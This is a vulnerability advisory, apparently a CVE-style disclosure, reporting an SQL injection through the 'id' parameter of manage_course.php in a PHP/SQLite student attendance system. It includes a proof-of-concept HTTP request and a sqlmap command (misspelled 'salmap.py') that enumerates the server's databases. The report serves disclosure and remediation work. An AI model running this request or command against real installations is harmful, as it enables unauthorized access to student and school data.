## Affected version: 
School Intramurals - Student Attendance Management System - 1.0

## Vendor:
https://www.sourcecodester.com/users/tips23

## Software:
https://www.sourcecodester.com/php/15920/school-intramurals-student-attendance-management-system-using-php-and-sqlite.html

## Vulnerability File:
/intrams_sams/manage_course.php?id=1*

## Description:
In-school - Student Attendance Management System 1.0 is vulnerable to unrestricted SQL injection attacks via /intrams_sams/manage_course.php, the controllable parameter is: id. This function brings the id parameter into the SQL statement for execution without any restrictions. A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database.

Status: CRITICAL

POC
```
GET /intrams_sams/manage_course.php?id=1* HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=ti9v91it1tp5drisi5i7b3944b
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
X-Forwarded-For: 192.168.1.23

```

sqlmap command
```salmap.py -r 1.txt --random-agent --threads=10 --dbs```

![image](https://github.com/Hefei-Coffee/cve/assets/168982375/82551bde-252d-4be8-a4c1-0f10e3cfc52a)


## code analysis:

The id parameter in manage_course.php is controllable and directly brought into the SQL statement for execution, causing SQL injection.

![image](https://github.com/Hefei-Coffee/cve/assets/168982375/a7055556-7994-4227-9b9a-efd37c4a72b8)


